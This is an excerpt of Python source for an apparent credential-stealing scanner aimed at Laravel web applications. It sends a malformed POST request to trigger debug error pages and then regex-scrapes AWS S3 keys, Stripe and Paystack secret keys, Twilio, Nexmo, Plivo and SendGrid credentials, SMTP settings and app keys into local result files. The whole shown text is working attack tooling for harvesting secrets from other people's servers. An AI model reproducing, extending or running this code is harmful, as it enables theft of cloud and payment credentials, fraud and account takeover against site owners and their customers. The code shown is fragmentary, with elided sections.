	...
	def get_awskey(self, text, url):
		try:
				if "S3_KEY=" in text:
					...
					method = 'debug'
					acc_sid = reg('<td>S3_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					secret_key = reg('<td>S3_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					try:
					 region = reg('<td>S3_DEFAULT_REGION<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					 if region == '' or region == '""' or region == 'null' or region == '***':
					     region = 'aws_unknown_region--'
					except:
					 region = 'aws_unknown_region--'
	...
	def get_skkey(self, text, url):
			if "STRIPE" in text:
				if "STRIPE_SECRET_KEY=" in text:
					...
					method = 'debug'
					try:
					 acc_sid = reg('<td>STRIPE_SECRET_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
					 try:
					  acc_sid = reg('<td>STRIPE_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					 except:
					  try:
					   acc_sid = reg('<td>STRIPE_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					  except:
					   try:
					    acc_sid = reg('<td>STRIPE_PUBLIC<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					   except:
					    try:
					     acc_sid = reg('<td>STRIPE_SECRET_PROD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					    except:
					     try:
					      acc_sid = reg('\nPAYSTACK_SECRET_KEY=(.*?)\n', text)[0]
					     except:
					      try:
					       acc_sid = reg('<td>STRIPEKEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					      except:
					       try:
					        acc_sid = reg('\nSTRIPE_PUBLISHABLE_KEY=(.*?)\n', text)[0]
					       except:
					        acc_sid = ''
				save = open('Results/SK_KEY.txt', 'a')
				save.write(acc_sid+'\n')
				save.close()
				return True
	...
	def get_nexmo(self, text, url):
		try:
			if "NEXMO" in text:
				...
				elif '<td>NEXMO_APIKEY</td>' in text:
					
					if "<td>NEXMO_APIKEY<\/td>" in text:
					   method = 'debug'
					...
					try:
						...
						try:
						 ...
						 try:
						  ...
						  try:
						   acc_sid = reg('<td>AUTH_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
						  except:
						   try:
...
def main(url):
	...
	try:
		...
		if "APP_NAME=" in get_source:
			resp = get_source 
		elif "APP_KEY=" in get_source:
			resp = get_source
		else:
			get_source = requests.post(url, data={"0x[]":"easy"}, headers=headers, timeout=8, verify=False, allow_redirects=False).text
			if "<td>APP_KEY</td>" in get_source:
			  resp = get_source
		if resp:
			getsmtp = easy().get_smtp(resp, url)
			get_plivo = easy().get_plivo(resp, url)
			getnexmo = easy().get_nexmo(resp, url)
			getskkey = easy().get_skkey(resp, url)
			getwilio = easy().get_twilio(resp, url)
			getaws = easy().get_awskey(resp, url)
			getsendg = easy().get_sendg(resp, url)
			get_appkey = easy().get_appkey(resp, url)
			if getnexmo:
				text += ' | \033[32;1mNEXMO\033[0m'
			else:
				text += ' | \033[31;1mNEXMO\033[0m'
			if getskkey:
				text += ' | \033[32;1mSK_KEY\033[0m'
			else:
				text += ' | \033[31;1mSK_KEY\033[0m'
			if get_plivo:
